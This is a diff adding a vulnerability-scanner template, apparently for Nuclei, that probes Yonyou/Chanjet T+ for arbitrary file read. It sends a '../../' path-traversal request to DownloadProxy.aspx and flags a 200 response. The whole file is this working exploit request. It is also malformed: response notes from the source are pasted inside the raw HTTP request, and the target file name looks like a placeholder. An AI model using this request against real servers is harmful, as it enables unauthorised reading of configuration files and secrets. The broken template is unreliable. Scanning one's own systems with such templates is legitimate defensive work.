@@ -1,0 +1,34 @@
+id: poc-ufh30zdvmwmivkzy
+info:
+  name: 用友 OA 畅捷通任意文件读取
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ufh30zdvmwmivkzy'
+  tags: lfi,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: ufh30zdvmwmivkzy
+    fofa: 暂无
+http:
+- raw:
+  - 'GET /tplus/SM/DTS/DownloadProxy.aspx?preload=1&Path=../../xinxinxinxinxinxinxin.Config HTTP/1.1
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    9
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
